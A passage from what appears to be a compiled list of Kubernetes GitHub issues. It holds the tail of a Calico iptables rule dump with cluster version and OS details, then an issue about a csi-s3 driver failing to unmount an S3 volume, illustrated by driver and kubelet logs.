cali-forward-endpoint-mark  all  --  anywhere             anywhere            [goto]  /* cali:5Z67OUUpTOM7Xa1a */ mark match ! 0x0/0xfff00000
RETURN     all  --  anywhere             anywhere             /* cali:M2Wf0OehNdig8MHR */
ACCEPT     ipencap--  anywhere             anywhere             /* cali:AJBkLho_0Qd8LNr3 */ /* Allow IPIP packets to other Calico hosts */ match-set cali40all-hosts-net dst ADDRTYPE match src-type LOCAL
MARK       all  --  anywhere             anywhere             /* cali:iz2RWXlXJDUfsLpe */ MARK and 0xfff0ffff
cali-to-host-endpoint  all  --  anywhere             anywhere             /* cali:xQqLi8S0sxbiyvjR */ ! ctstate DNAT
ACCEPT     all  --  anywhere             anywhere             /* cali:aSnsxZdmhxm_ilRZ */ /* Host endpoint policy accepted packet. */ mark match 0x10000/0x10000

Chain cali-cidr-block (1 references)
target     prot opt source               destination         

Chain cali-forward-check (1 references)
target     prot opt source               destination         
RETURN     all  --  anywhere             anywhere             /* cali:Pbldlb4FaULvpdD8 */ ctstate RELATED,ESTABLISHED
cali-set-endpoint-mark  tcp  --  anywhere             anywhere            [goto]  /* cali:ZD-6UxuUtGW-xtzg */ /* To kubernetes NodePort service */ multiport dports 30000:32767 match-set cali40this-host dst
cali-set-endpoint-mark  udp  --  anywhere             anywhere            [goto]  /* cali:CbPfUajQ2bFVnDq4 */ /* To kubernetes NodePort service */ multiport dports 30000:32767 match-set cali40this-host dst
cali-set-endpoint-mark  all  --  anywhere             anywhere             /* cali:jmhU0ODogX-Zfe5g */ /* To kubernetes service */ ! match-set cali40this-host dst

Chain cali-forward-endpoint-mark (1 references)
target     prot opt source               destination         
cali-from-endpoint-mark  all  --  anywhere             anywhere             /* cali:O0SmFDrnm7KggWqW */ mark match ! 0x100000/0xfff00000
cali-to-wl-dispatch  all  --  anywhere             anywhere             /* cali:aFl0WFKRxDqj8oA6 */
cali-to-hep-forward  all  --  anywhere             anywhere             /* cali:AZKVrO3i_8cLai5f */
MARK       all  --  anywhere             anywhere             /* cali:96HaP1sFtb-NYoYA */ MARK and 0xfffff
ACCEPT     all  --  anywhere             anywhere             /* cali:VxO6hyNWz62YEtul */ /* Policy explicitly accepted packet. */ mark match 0x10000/0x10000

Chain cali-from-endpoint-mark (1 references)
target     prot opt source               destination         
cali-fw-cali1a60675da04  all  --  anywhere             anywhere            [goto]  /* cali:_g0DAJdwj0zFTZDd */ mark match 0x40300000/0xfff00000
cali-fw-cali61bf3705192  all  --  anywhere             anywhere            [goto]  /* cali:_xvgcxf_OYnxRPpL */ mark match 0x93400000/0xfff00000
cali-fw-cali80d4429314e  all  --  anywhere             anywhere            [goto]  /* cali:vobAwpu2w-OpfxcW */ mark match 0xf9e00000/0xfff00000
cali-fw-caliaff77ba4713  all  --  anywhere             anywhere            [goto]  /* cali:2NCz6Z8qUvBSq-1n */ mark match 0x92300000/0xfff00000
DROP       all  --  anywhere             anywhere             /* cali:Iami5Z3O-giBayN1 */ /* Unknown interface */

Chain cali-from-hep-forward (1 references)
target     prot opt source               destination         

Chain cali-from-host-endpoint (1 references)
target     prot opt source               destination         

Chain cali-from-wl-dispatch (2 references)
target     prot opt source               destination         
cali-fw-cali1a60675da04  all  --  anywhere             anywhere            [goto]  /* cali:K9tdwcxEej5TWJwt */
cali-fw-cali61bf3705192  all  --  anywhere             anywhere            [goto]  /* cali:tCrG_oPsjs7oDjiR */
cali-fw-cali80d4429314e  all  --  anywhere             anywhere            [goto]  /* cali:ty0aZN9DLespD-He */
cali-fw-caliaff77ba4713  all  --  anywhere             anywhere            [goto]  /* cali:RuLvWlq3xyYNFBBq */
DROP       all  --  anywhere             anywhere             /* cali:TzHmjW1BcVePGwUs */ /* Unknown interface */

Chain cali-fw-cali1a60675da04 (2 references)
target     prot opt source               destination         
ACCEPT     all  --  anywhere             anywhere             /* cali:ZGWFfGodtixX8XmQ */ ctstate RELATED,ESTABLISHED
DROP       all  --  anywhere             anywhere             /* cali:NsuY-Vd-csUklFg6 */ ctstate INVALID
MARK       all  --  anywhere             anywhere             /* cali:HEkNokvoMUqhs_mz */ MARK and 0xfffeffff
DROP       udp  --  anywhere             anywhere             /* cali:yT2TFLX6lbgFvt06 */ /* Drop VXLAN encapped packets originating in workloads */ multiport dports 4789
DROP       ipencap--  anywhere             anywhere             /* cali:JeohvZMA2MUMtka- */ /* Drop IPinIP encapped packets originating in workloads */
cali-pro-kns.kube-system  all  --  anywhere             anywhere             /* cali:Ry3YsktIkN_WGshL */
RETURN     all  --  anywhere             anywhere             /* cali:j42-VxrHhDCsCHKq */ /* Return if profile accepted */ mark match 0x10000/0x10000
cali-pro-_u2Tn2rSoAPffvE7JO6  all  --  anywhere             anywhere             /* cali:DZeztPbl9GuWcSnS */
RETURN     all  --  anywhere             anywhere             /* cali:QlAcy0LXTxrSFoIZ */ /* Return if profile accepted */ mark match 0x10000/0x10000
DROP       all  --  anywhere             anywhere             /* cali:020SLlST78qhqnSb */ /* Drop if no profiles matched */

Chain cali-fw-cali61bf3705192 (2 references)
target     prot opt source               destination         
ACCEPT     all  --  anywhere             anywhere             /* cali:HukEhemyC3jUEB2h */ ctstate RELATED,ESTABLISHED
DROP       all  --  anywhere             anywhere             /* cali:nS7m2w5F8T8HFKDB */ ctstate INVALID
MARK       all  --  anywhere             anywhere             /* cali:SyHL_U3-NYfJnzHU */ MARK and 0xfffeffff
DROP       udp  --  anywhere             anywhere             /* cali:7W0TplglhR5tCDL8 */ /* Drop VXLAN encapped packets originating in workloads */ multiport dports 4789
DROP       ipencap--  anywhere             anywhere             /* cali:-qjAC-m_cklBJkjl */ /* Drop IPinIP encapped packets originating in workloads */
cali-pro-kns.gpu-operator  all  --  anywhere             anywhere             /* cali:6Dm_rdQkT2d-xn0M */
RETURN     all  --  anywhere             anywhere             /* cali:xNfbxZAEEE0ZBeFn */ /* Return if profile accepted */ mark match 0x10000/0x10000
cali-pro-_4AJPMUgjnkp6PvIZs_  all  --  anywhere             anywhere             /* cali:umAELb2j4mLttFOx */
RETURN     all  --  anywhere             anywhere             /* cali:FiF3VTCFM8GBIctG */ /* Return if profile accepted */ mark match 0x10000/0x10000
DROP       all  --  anywhere             anywhere             /* cali:9kcFLKXYuJ3kjgED */ /* Drop if no profiles matched */

Chain cali-fw-cali80d4429314e (2 references)
target     prot opt source               destination         
ACCEPT     all  --  anywhere             anywhere             /* cali:g7SK49eF3d8GQTzM */ ctstate RELATED,ESTABLISHED
DROP       all  --  anywhere             anywhere             /* cali:VWWFvGl1dJh0Cblf */ ctstate INVALID
MARK       all  --  anywhere             anywhere             /* cali:QXXXDB_vuQ4LM5oU */ MARK and 0xfffeffff
DROP       udp  --  anywhere             anywhere             /* cali:47ZKBD6pl4tSINwl */ /* Drop VXLAN encapped packets originating in workloads */ multiport dports 4789
DROP       ipencap--  anywhere             anywhere             /* cali:bBEbmNiq-HYa4oz8 */ /* Drop IPinIP encapped packets originating in workloads */
cali-pro-kns.gpu-operator  all  --  anywhere             anywhere             /* cali:V-1mwp2arUxEn_dH */
RETURN     all  --  anywhere             anywhere             /* cali:mCCRhepT2W1NMr-Z */ /* Return if profile accepted */ mark match 0x10000/0x10000
cali-pro-_7Z-cbWmLXlJI5GWsIJ  all  --  anywhere             anywhere             /* cali:DhDPbLnz1bOTKjAj */
RETURN     all  --  anywhere             anywhere             /* cali:-tfrAm7GnlHHz19t */ /* Return if profile accepted */ mark match 0x10000/0x10000
DROP       all  --  anywhere             anywhere             /* cali:wFkb_R24Tl5nk2uM */ /* Drop if no profiles matched */

Chain cali-fw-caliaff77ba4713 (2 references)
target     prot opt source               destination         
ACCEPT     all  --  anywhere             anywhere             /* cali:zAhgVOdw1_ZwY_qX */ ctstate RELATED,ESTABLISHED
DROP       all  --  anywhere             anywhere             /* cali:E_elvvjGDtCyrp2s */ ctstate INVALID
MARK       all  --  anywhere             anywhere             /* cali:wYbvB5dlGZFEmI7z */ MARK and 0xfffeffff
DROP       udp  --  anywhere             anywhere             /* cali:Sv2vOgdI-3JOJHV0 */ /* Drop VXLAN encapped packets originating in workloads */ multiport dports 4789
DROP       ipencap--  anywhere             anywhere             /* cali:Ini0PSE7tGhtZvB1 */ /* Drop IPinIP encapped packets originating in workloads */
cali-pro-kns.gpu-operator  all  --  anywhere             anywhere             /* cali:4yzbR1i3_3i5zBej */
RETURN     all  --  anywhere             anywhere             /* cali:seHIJ440rgN8m2Gl */ /* Return if profile accepted */ mark match 0x10000/0x10000
cali-pro-_4AJPMUgjnkp6PvIZs_  all  --  anywhere             anywhere             /* cali:G06ddVJcUNN-QcI_ */
RETURN     all  --  anywhere             anywhere             /* cali:0oAp0x-lyWfDbm7q */ /* Return if profile accepted */ mark match 0x10000/0x10000
DROP       all  --  anywhere             anywhere             /* cali:E-X7DQX5M64GSk2C */ /* Drop if no profiles matched */

Chain cali-pri-_4AJPMUgjnkp6PvIZs_ (2 references)
target     prot opt source               destination         
           all  --  anywhere             anywhere             /* cali:6-P0HapqloRNafEU */ /* Profile ksa.gpu-operator.node-feature-discovery ingress */

Chain cali-pri-_7Z-cbWmLXlJI5GWsIJ (1 references)
target     prot opt source               destination         
           all  --  anywhere             anywhere             /* cali:33eST6J3mye-oils */ /* Profile ksa.gpu-operator.gpu-operator ingress */

Chain cali-pri-_u2Tn2rSoAPffvE7JO6 (1 references)
target     prot opt source               destination         
           all  --  anywhere             anywhere             /* cali:WqgznqAQ-uYV0oBx */ /* Profile ksa.kube-system.coredns ingress */

Chain cali-pri-kns.gpu-operator (3 references)
target     prot opt source               destination         
MARK       all  --  anywhere             anywhere             /* cali:MVC_LdvqXMM61ZiS */ /* Profile kns.gpu-operator ingress */ MARK or 0x10000
RETURN     all  --  anywhere             anywhere             /* cali:s0wCV1amxXQsLjX6 */ mark match 0x10000/0x10000

Chain cali-pri-kns.kube-system (1 references)
target     prot opt source               destination         
MARK       all  --  anywhere             anywhere             /* cali:J1TyxtHWd0qaBGK- */ /* Profile kns.kube-system ingress */ MARK or 0x10000
RETURN     all  --  anywhere             anywhere             /* cali:QIB6k7eEKdIg73Jp */ mark match 0x10000/0x10000

Chain cali-pro-_4AJPMUgjnkp6PvIZs_ (2 references)
target     prot opt source               destination         
           all  --  anywhere             anywhere             /* cali:67xwX_Dluk58rujA */ /* Profile ksa.gpu-operator.node-feature-discovery egress */

Chain cali-pro-_7Z-cbWmLXlJI5GWsIJ (1 references)
target     prot opt source               destination         
           all  --  anywhere             anywhere             /* cali:Jt8hHFPFkxNxFHV9 */ /* Profile ksa.gpu-operator.gpu-operator egress */

Chain cali-pro-_u2Tn2rSoAPffvE7JO6 (1 references)
target     prot opt source               destination         
           all  --  anywhere             anywhere             /* cali:0-_UPh39dt5XfhmJ */ /* Profile ksa.kube-system.coredns egress */

Chain cali-pro-kns.gpu-operator (3 references)
target     prot opt source               destination         
MARK       all  --  anywhere             anywhere             /* cali:dowjNH-r-IuDxByL */ /* Profile kns.gpu-operator egress */ MARK or 0x10000
RETURN     all  --  anywhere             anywhere             /* cali:9xl88GIXoFBqCna9 */ mark match 0x10000/0x10000

Chain cali-pro-kns.kube-system (1 references)
target     prot opt source               destination         
MARK       all  --  anywhere             anywhere             /* cali:tgOR2S8DVHZW3F1M */ /* Profile kns.kube-system egress */ MARK or 0x10000
RETURN     all  --  anywhere             anywhere             /* cali:HVEEtYPJsiGRXCIt */ mark match 0x10000/0x10000

Chain cali-set-endpoint-mark (3 references)
target     prot opt source               destination         
cali-sm-cali1a60675da04  all  --  anywhere             anywhere            [goto]  /* cali:-46PjhDiNsRWf1FU */
cali-sm-cali61bf3705192  all  --  anywhere             anywhere            [goto]  /* cali:q_vQECIkADutQIWL */
cali-sm-cali80d4429314e  all  --  anywhere             anywhere            [goto]  /* cali:kXqypj13p8lEFDTx */
cali-sm-caliaff77ba4713  all  --  anywhere             anywhere            [goto]  /* cali:KkkLwmGp8wgvlkny */
DROP       all  --  anywhere             anywhere             /* cali:9Lj2OU8ZON1EJ4XC */ /* Unknown endpoint */
MARK       all  --  anywhere             anywhere             /* cali:3mMep0QEGmc9Qt7q */ /* Non-Cali endpoint mark */ MARK xset 0x100000/0xfff00000

Chain cali-sm-cali1a60675da04 (1 references)
target     prot opt source               destination         
MARK       all  --  anywhere             anywhere             /* cali:cFx4mA6whaURTNOC */ MARK xset 0x40300000/0xfff00000

Chain cali-sm-cali61bf3705192 (1 references)
target     prot opt source               destination         
MARK       all  --  anywhere             anywhere             /* cali:SQRm6KIr7h0YoMIZ */ MARK xset 0x93400000/0xfff00000

Chain cali-sm-cali80d4429314e (1 references)
target     prot opt source               destination         
MARK       all  --  anywhere             anywhere             /* cali:msddQTu3_4-8yx_x */ MARK xset 0xf9e00000/0xfff00000

Chain cali-sm-caliaff77ba4713 (1 references)
target     prot opt source               destination         
MARK       all  --  anywhere             anywhere             /* cali:RZKZ_MnNUqUKKGiD */ MARK xset 0x92300000/0xfff00000

Chain cali-to-hep-forward (2 references)
target     prot opt source               destination         

Chain cali-to-host-endpoint (1 references)
target     prot opt source               destination         

Chain cali-to-wl-dispatch (2 references)
target     prot opt source               destination         
cali-tw-cali1a60675da04  all  --  anywhere             anywhere            [goto]  /* cali:zIuiWorw_-gqLEXO */
cali-tw-cali61bf3705192  all  --  anywhere             anywhere            [goto]  /* cali:xag75YL5akcG0XLF */
cali-tw-cali80d4429314e  all  --  anywhere             anywhere            [goto]  /* cali:gYjFDNf-SltrRZB7 */
cali-tw-caliaff77ba4713  all  --  anywhere             anywhere            [goto]  /* cali:FdkGAd3ATwS-vVVD */
DROP       all  --  anywhere             anywhere             /* cali:fqHovg-WPs4e6zTK */ /* Unknown interface */

Chain cali-tw-cali1a60675da04 (1 references)
target     prot opt source               destination         
ACCEPT     all  --  anywhere             anywhere             /* cali:w1Cm2ULOSvjTHudq */ ctstate RELATED,ESTABLISHED
DROP       all  --  anywhere             anywhere             /* cali:9umnlXX6GO6Vc4_C */ ctstate INVALID
MARK       all  --  anywhere             anywhere             /* cali:4hLjdY3hkfGFs4uD */ MARK and 0xfffeffff
cali-pri-kns.kube-system  all  --  anywhere             anywhere             /* cali:gLTSlA3UVavlYqRu */
RETURN     all  --  anywhere             anywhere             /* cali:1pYcsK43THPrR8Qt */ /* Return if profile accepted */ mark match 0x10000/0x10000
cali-pri-_u2Tn2rSoAPffvE7JO6  all  --  anywhere             anywhere             /* cali:tA0_fCHeaUVu5_kN */
RETURN     all  --  anywhere             anywhere             /* cali:5PoHpiQMvOhdA4jr */ /* Return if profile accepted */ mark match 0x10000/0x10000
DROP       all  --  anywhere             anywhere             /* cali:6P9MHq2lZbGcJMUs */ /* Drop if no profiles matched */

Chain cali-tw-cali61bf3705192 (1 references)
target     prot opt source               destination         
ACCEPT     all  --  anywhere             anywhere             /* cali:4TsaIXYZcZWbiXXW */ ctstate RELATED,ESTABLISHED
DROP       all  --  anywhere             anywhere             /* cali:xlvqDm2nH2zq4V8p */ ctstate INVALID
MARK       all  --  anywhere             anywhere             /* cali:GU1FuBxFrFydlHq3 */ MARK and 0xfffeffff
cali-pri-kns.gpu-operator  all  --  anywhere             anywhere             /* cali:1uJveElD9OXuShKZ */
RETURN     all  --  anywhere             anywhere             /* cali:l928XWHGLf6ksfAV */ /* Return if profile accepted */ mark match 0x10000/0x10000
cali-pri-_4AJPMUgjnkp6PvIZs_  all  --  anywhere             anywhere             /* cali:n-nBk2VPtnM1xYwe */
RETURN     all  --  anywhere             anywhere             /* cali:wkuEQFdIIQ77Wq7W */ /* Return if profile accepted */ mark match 0x10000/0x10000
DROP       all  --  anywhere             anywhere             /* cali:ElgyHAWClRlWkpqG */ /* Drop if no profiles matched */

Chain cali-tw-cali80d4429314e (1 references)
target     prot opt source               destination         
ACCEPT     all  --  anywhere             anywhere             /* cali:H1jNyDPmKvDDn5Vk */ ctstate RELATED,ESTABLISHED
DROP       all  --  anywhere             anywhere             /* cali:NcCXk1FMcyKvN-0s */ ctstate INVALID
MARK       all  --  anywhere             anywhere             /* cali:JlnCwI9rZZNdivZU */ MARK and 0xfffeffff
cali-pri-kns.gpu-operator  all  --  anywhere             anywhere             /* cali:GVRxY9RD3CcrgUk3 */
RETURN     all  --  anywhere             anywhere             /* cali:10QG2G9XDcx2Bwfi */ /* Return if profile accepted */ mark match 0x10000/0x10000
cali-pri-_7Z-cbWmLXlJI5GWsIJ  all  --  anywhere             anywhere             /* cali:JOmVuKKbAS2BFWnc */
RETURN     all  --  anywhere             anywhere             /* cali:pcYu_mJoNuj2B6Cj */ /* Return if profile accepted */ mark match 0x10000/0x10000
DROP       all  --  anywhere             anywhere             /* cali:AxCTJffEY1zGhysc */ /* Drop if no profiles matched */

Chain cali-tw-caliaff77ba4713 (1 references)
target     prot opt source               destination         
ACCEPT     all  --  anywhere             anywhere             /* cali:Wm5cRViQaTB0AM6_ */ ctstate RELATED,ESTABLISHED
DROP       all  --  anywhere             anywhere             /* cali:3jOmjG1mkPWiBb57 */ ctstate INVALID
MARK       all  --  anywhere             anywhere             /* cali:1AAP5imvUYhZQLJE */ MARK and 0xfffeffff
cali-pri-kns.gpu-operator  all  --  anywhere             anywhere             /* cali:PfCoNSFnCX-GKCGz */
RETURN     all  --  anywhere             anywhere             /* cali:A9mVsPhWlgdu61dl */ /* Return if profile accepted */ mark match 0x10000/0x10000
cali-pri-_4AJPMUgjnkp6PvIZs_  all  --  anywhere             anywhere             /* cali:fOMutePJ56ab3bD_ */
RETURN     all  --  anywhere             anywhere             /* cali:jNAhD8xZ9K3Laqwi */ /* Return if profile accepted */ mark match 0x10000/0x10000
DROP       all  --  anywhere             anywhere             /* cali:nWbl-mTELMxfckFL */ /* Drop if no profiles matched */

Chain cali-wl-to-host (1 references)
target     prot opt source               destination         
cali-from-wl-dispatch  all  --  anywhere             anywhere             /* cali:Ee9Sbo10IpVujdIY */
ACCEPT     all  --  anywhere             anywhere             /* cali:nSZbcOoG1xPONxb8 */ /* Configured DefaultEndpointToHostAction */
```

#### Kubernetes version

<details>

```console
user@randomhost:~$ kubectl version
Client Version: v1.28.4
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.28.6
```
k8s version : `1.28.3`, `1.28.4`
</details>


#### Cloud provider

<details>
Onpremise
</details>


#### OS version

<details>

```bash
user@randomhost:~$ cat /etc/os-release
PRETTY_NAME="Ubuntu 22.04.3 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.3 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=jammy
```

</details>


#### Install tools

<details>
kubeadm
</details>


#### Container runtime (CRI) and version (if applicable)

<details>
containerd
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>
calico
</details>

### åˆ†æç»“æœ

ä¸æ¶‰åŠ

---

## Issue #123934 csi-s3 container cant unmount a volume

- Issue é“¾æ¥ï¼š[#123934](https://github.com/kubernetes/kubernetes/issues/123934)

### Issue å†…å®¹

#### What happened?

I am using an s3 bucket as volume for my app running in k8s (deployment, 1 replica, rolling update).

When I triggered the deployment of a new revision of my app, the new pod got up and the s3 bucket attached to the new pod.
However, the old pod is failed because it was terminated with an error 137 (probably SIGKILL instead of OOM due to a small gracefull shutdown window, because I don't see any memory related issues right now). 

One big problem is that the old pod is stuck in a terminating state and I guess due to the volume problem.  

Datashim can not unmount the volume from node where was the old pod. csi-s3 pod (csi-s3 container, daemonset) log: 

```bash
2024-03-13T21:04:45.001866708Z stderr F I0313 21:04:45.001667       1 utils.go:98] GRPC request: {}
2024-03-13T21:04:45.001885266Z stderr F I0313 21:04:45.001715       1 utils.go:103] GRPC response: {"capabilities":[{"Type":{"Rpc":{"type":1}}}]}
2024-03-13T21:05:33.635813571Z stderr F I0313 21:05:33.635664       1 utils.go:97] GRPC call: /csi.v1.Node/NodeGetCapabilities
2024-03-13T21:05:33.635874907Z stderr F I0313 21:05:33.635690       1 utils.go:98] GRPC request: {}
2024-03-13T21:05:33.63589224Z stderr F I0313 21:05:33.635736       1 utils.go:103] GRPC response: {"capabilities":[{"Type":{"Rpc":{"type":1}}}]}
2024-03-13T21:05:37.030960679Z stderr F I0313 21:05:37.027972       1 utils.go:97] GRPC call: /csi.v1.Node/NodeUnpublishVolume
2024-03-13T21:05:37.030981533Z stderr F I0313 21:05:37.027993       1 utils.go:98] GRPC request: {"target_path":"/var/lib/kubelet/pods/36180d66-5fa5-4393-a84d-df95afe5a369/volumes/kubernetes.io~csi/pvc-1ec40a67-78bd-4501-9dd8-bd2c4cb58648/mount","volume_id":"pvc-1ec40a67-78bd-4501-9dd8-bd2c4cb58648"}
2024-03-13T21:05:37.035823492Z stderr F I0313 21:05:37.035232       1 util.go:75] Found matching pid 87 on path /var/lib/kubelet/pods/36180d66-5fa5-4393-a84d-df95afe5a369/volumes/kubernetes.io~csi/pvc-1ec40a67-78bd-4501-9dd8-bd2c4cb58648/mount
2024-03-13T21:05:37.035848546Z stderr F I0313 21:05:37.035254       1 mounter.go:80] Found fuse pid 87 of mount /var/lib/kubelet/pods/36180d66-5fa5-4393-a84d-df95afe5a369/volumes/kubernetes.io~csi/pvc-1ec40a67-78bd-4501-9dd8-bd2c4cb58648/mount, checking if it still runs
2024-03-13T21:05:37.035853313Z stderr F I0313 21:05:37.035273       1 util.go:39] Fuse process with PID 87 still active, waiting...
2024-03-13T21:05:37.135710883Z stderr F I0313 21:05:37.135582       1 util.go:39] Fuse process with PID 87 still active, waiting...
2024-03-13T21:05:37.336121403Z stderr F I0313 21:05:37.335983       1 util.go:39] Fuse process with PID 87 still active, waiting...
2024-03-13T21:05:37.636843237Z stderr F I0313 21:05:37.636538       1 util.go:39] Fuse process with PID 87 still active, waiting...
2024-03-13T21:05:38.037307936Z stderr F I0313 21:05:38.037173       1 util.go:39] Fuse process with PID 87 still active, waiting...
2024-03-13T21:05:38.538075749Z stderr F I0313 21:05:38.537942       1 util.go:39] Fuse process with PID 87 still active, waiting...
2024-03-13T21:05:39.13912303Z stderr F I0313 21:05:39.138960       1 util.go:39] Fuse process with PID 87 still active, waiting...
2024-03-13T21:05:39.839917198Z stderr F I0313 21:05:39.839762       1 util.go:39] Fuse process with PID 87 still active, waiting...
2024-03-13T21:05:40.640972203Z stderr F I0313 21:05:40.640842       1 util.go:39] Fuse process with PID 87 still active, waiting...
2024-03-13T21:05:41.542074541Z stderr F I0313 21:05:41.541932       1 util.go:39] Fuse process with PID 87 still active, waiting...
2024-03-13T21:05:42.542234381Z stderr F I0313 21:05:42.542094       1 util.go:39] Fuse process with PID 87 still active, waiting...
2024-03-13T21:05:43.64277079Z stderr F I0313 21:05:43.642634       1 util.go:39] Fuse process with PID 87 still active, waiting...
2024-03-13T21:05:44.843399965Z stderr F I0313 21:05:44.843259       1 util.go:39] Fuse process with PID 87 still active, waiting...
2024-03-13T21:05:46.14365466Z stderr F I0313 21:05:46.143473       1 util.go:39] Fuse process with PID 87 still active, waiting...
2024-03-13T21:05:47.543820527Z stderr F I0313 21:05:47.543692       1 util.go:39] Fuse process with PID 87 still active, waiting...
2024-03-13T21:05:49.044170561Z stderr F I0313 21:05:49.044067       1 util.go:39] Fuse process with PID 87 still active, waiting...
2024-03-13T21:05:50.645274452Z stderr F I0313 21:05:50.645124       1 util.go:39] Fuse process with PID 87 still active, waiting...
2024-03-13T21:05:52.345495246Z stderr F I0313 21:05:52.345336       1 util.go:39] Fuse process with PID 87 still active, waiting...
2024-03-13T21:05:54.145711584Z stderr F I0313 21:05:54.145589       1 util.go:39] Fuse process with PID 87 still active, waiting...
2024-03-13T21:05:56.046229119Z stderr F E0313 21:05:56.046082       1 utils.go:101] GRPC error: rpc error: code = Internal desc = Timeout waiting for PID 87 to
 end
2024-03-13T21:05:56.625507593Z stderr F I0313 21:05:56.625330       1 utils.go:97] GRPC call: /csi.v1.Node/NodeUnpublishVolume
2024-03-13T21:05:56.625532689Z stderr F I0313 21:05:56.625367       1 utils.go:98] GRPC request: {"target_path":"/var/lib/kubelet/pods/36180d66-5fa5-4393-a84d-
df95afe5a369/volumes/kubernetes.io~csi/pvc-1ec40a67-78bd-4501-9dd8-bd2c4cb58648/mount","volume_id":"pvc-1ec40a67-78bd-4501-9dd8-bd2c4cb58648"}
2024-03-13T21:05:56.626775Z stderr F E0313 21:05:56.626655       1 utils.go:101] GRPC error: rpc error: code = Internal desc = unmount failed: exit status 1
2024-03-13T21:05:56.626785867Z stderr F Unmounting arguments: /var/lib/kubelet/pods/36180d66-5fa5-4393-a84d-df95afe5a369/volumes/kubernetes.io~csi/pvc-1ec40a67
-78bd-4501-9dd8-bd2c4cb58648/mount
2024-03-13T21:05:56.626789088Z stderr F Output: umount: can't unmount /var/lib/kubelet/pods/36180d66-5fa5-4393-a84d-df95afe5a369/volumes/kubernetes.io~csi/pvc-
1ec40a67-78bd-4501-9dd8-bd2c4cb58648/mount: Invalid argument
2024-03-13T21:05:57.632955973Z stderr F I0313 21:05:57.632811       1 utils.go:97] GRPC call: /csi.v1.Node/NodeUnpublishVolume
2024-03-13T21:05:57.632982344Z stderr F I0313 21:05:57.632830       1 utils.go:98] GRPC request: {"target_path":"/var/lib/kubelet/pods/36180d66-5fa5-4393-a84d-
df95afe5a369/volumes/kubernetes.io~csi/pvc-1ec40a67-78bd-4501-9dd8-bd2c4cb58648/mount","volume_id":"pvc-1ec40a67-78bd-4501-9dd8-bd2c4cb58648"}
2024-03-13T21:05:57.634391298Z stderr F E0313 21:05:57.634256       1 utils.go:101] GRPC error: rpc error: code = Internal desc = unmount failed: exit status 1
2024-03-13T21:05:57.634405692Z stderr F Unmounting arguments: /var/lib/kubelet/pods/36180d66-5fa5-4393-a84d-df95afe5a369/volumes/kubernetes.io~csi/pvc-1ec40a67
-78bd-4501-9dd8-bd2c4cb58648/mount
2024-03-13T21:05:57.634410456Z stderr F Output: umount: can't unmount /var/lib/kubelet/pods/36180d66-5fa5-4393-a84d-df95afe5a369/volumes/kubernetes.io~csi/pvc-
1ec40a67-78bd-4501-9dd8-bd2c4cb58648/mount: Invalid argument
``` 

Onwards, `Output: umount: can't unmount /var/lib/kubelet/pods/36180d66-5fa5-4393-a84d-df95afe5a369/volumes/kubernetes.io~csi/pvc-
1ec40a67-78bd-4501-9dd8-bd2c4cb58648/mount: Invalid argument` repeats indefinitely.

Kubelet produces similar logs on the node where the failed pod is: 
```bash
-- Logs begin at Wed 2024-03-06 20:07:38 UTC, end at Thu 2024-03-14 13:33:03 UTC. --
Mar 14 13:33:03 ip-172-31-30-130.eu-central-1.compute.internal kubelet[3207]: Output: umount: can't unmount /var/lib/kubelet/pods/36180d66-5fa5-4393-a84d-df95afe5a369/volumes/kubernetes.io~csi/pvc-1ec40a67-78bd-4501-9dd8-bd2c4cb58648/mount: Invalid argument
Mar 14 13:33:03 ip-172-31-30-130.eu-central-1.compute.internal kubelet[3207]: Unmounting arguments: /var/lib/kubelet/pods/36180d66-5fa5-4393-a84d-df95afe5a369/volumes/kubernetes.io~csi/pvc-1ec40a67-78bd-4501-9dd8-bd2c4cb58648/mount
Mar 14 13:33:03 ip-172-31-30-130.eu-central-1.compute.internal kubelet[3207]: E0314 13:33:03.729406    3207 nestedpendingoperations.go:348] Operation for "{volumeName:kubernetes.io/csi/ch.ctrox.csi.s3-driver^pvc-1ec40a67-78bd-4501-9dd8-bd2c4cb58648 podName:36180d66-5fa5-4393-a84d-df95afe5a369 nodeName:}" failed. No retries permitted until 2024-03-14 13:35:05.729378976 +0000 UTC m=+667629.606875374 (durationBeforeRetry 2m2s). Error: UnmountVolume.TearDown failed for volume "documents-storage-s3" (UniqueName: "kubernetes.io/csi/ch.ctrox.csi.s3-driver^pvc-1ec40a67-78bd-4501-9dd8-bd2c4cb58648") pod "36180d66-5fa5-4393-a84d-df95afe5a369" (UID: "36180d66-5fa5-4393-a84d-df95afe5a369") : kubernetes.io/csi: Unmounter.TearDownAt failed: rpc error: code = Internal desc = unmount failed: exit status 1
Mar 14 13:33:03 ip-172-31-30-130.eu-central-1.compute.internal kubelet[3207]: I0314 13:33:03.651414    3207 reconciler_common.go:172] "operationExecutor.UnmountVolume started for volume \"documents-storage-s3\" (UniqueName: \"kubernetes.io/csi/ch.ctrox.csi.s3-driver^pvc-1ec40a67-78bd-4501-9dd8-bd2c4cb58648\") pod \"36180d66-5fa5-4393-a84d-df95afe5a369\" (UID: \"36180d66-5fa5-4393-a84d-df95afe5a369\") "
Mar 14 13:31:01 ip-172-31-30-130.eu-central-1.compute.internal kubelet[3207]: Output: umount: can't unmount /var/lib/kubelet/pods/36180d66-5fa5-4393-a84d-df95afe5a369/volumes/kubernetes.io~csi/pvc-1ec40a67-78bd-4501-9dd8-bd2c4cb58648/mount: Invalid argument
Mar 14 13:31:01 ip-172-31-30-130.eu-central-1.compute.internal kubelet[3207]: Unmounting arguments: /var/lib/kubelet/pods/36180d66-5fa5-4393-a84d-df95afe5a369/volumes/kubernetes.io~csi/pvc-1ec40a67-78bd-4501-9dd8-bd2c4cb58648/mount
